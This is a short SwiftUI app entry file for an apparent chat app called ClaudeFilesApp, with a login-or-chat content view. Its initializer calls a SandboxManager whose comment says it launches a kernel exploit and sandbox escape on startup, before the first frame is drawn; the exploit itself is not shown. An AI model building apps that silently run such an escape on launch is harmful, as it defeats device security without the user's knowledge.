import SwiftUI

@main
struct ClaudeFilesApp: App {
    @StateObject private var auth    = AuthManager.shared
    @StateObject private var store   = ConversationStore()
    @StateObject private var sandbox = SandboxManager.shared

    init() {
        // Kick off the kernel exploit + sandbox escape immediately on launch,
        // before the first frame is drawn.  Runs on a background thread.
        SandboxManager.shared.activate()
    }

    var body: some Scene {
        WindowGroup {
            ContentView()
                .environmentObject(auth)
                .environmentObject(store)
                .environmentObject(sandbox)
        }
    }
}

struct ContentView: View {
    @EnvironmentObject var auth: AuthManager

    var body: some View {
        if auth.isAuthenticated {
            ChatView()
        } else {
            LoginView()
        }
    }
}
